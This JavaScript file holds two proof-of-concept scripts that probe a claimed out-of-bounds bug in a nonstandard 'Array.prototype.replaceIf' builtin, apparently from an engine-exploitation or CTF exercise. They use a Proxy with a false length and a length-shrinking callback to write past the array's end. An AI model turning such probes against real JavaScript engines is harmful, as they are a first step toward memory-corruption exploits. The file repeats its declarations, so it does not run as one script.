// POC for Array.prototype.replaceIf vulnerability
// Create a target array with specific length
let target = new Array(10).fill(0);

// Create a proxy with a handler that manipulates the length
let handler = {
  get: function(target, prop, receiver) {
    if (prop === 'length') {
      console.log("Length requested, returning 10");
      return 10; // Always return 10 for length
    }
    return Reflect.get(...arguments);
  }
};

let proxy = new Proxy(target, handler);

// Set up a callback that will be used in replaceIf
// This callback always returns true
function callback(element) {
  console.log("Callback called with:", element);
  // After callback is called, we should be able to modify target
  target.length = 5; // Shorten target array length 
  console.log("Target length changed to:", target.length);
  return true;
}

// Call replaceIf with index 7 (which is valid according to proxy length)
let result = Array.prototype.replaceIf.call(proxy, 7, callback, 1337);

console.log("Result:", result);
console.log("Target array:", target);
console.log("Target length:", target.length);
console.log("Proxy reported length:", proxy.length);

// Check if we can access beyond the actual array length
console.log("Element at index 7:", target[7]);

// POC for Array.prototype.replaceIf vulnerability
// Create a target array
let target = new Array(5).fill(0);
console.log("Initial target:", target);

// Create a proxy with a handler that returns a larger length
let handler = {
  get: function(target, prop, receiver) {
    if (prop === 'length') {
      console.log("Length requested, returning 10");
      return 10; // Return larger length than actual
    }
    return Reflect.get(...arguments);
  }
};

let proxy = new Proxy(target, handler);

// Our callback that always returns true
function callback(element, index) {
  console.log(`Callback called with element: ${element}, index: ${index}`);
  return true;
}

// Try to write to index 7, which is out of bounds of the actual array
// but within bounds of what the proxy reports
console.log("Calling replaceIf with index 7");
let result = Array.prototype.replaceIf.call(proxy, 7, callback, 1337);

console.log("Result:", result);
console.log("Target array:", target);
console.log("Target length:", target.length);
console.log("Element at index 7:", target[7]);

// Check if the length has been automatically extended
console.log("Has length been extended?", target.length > 5);

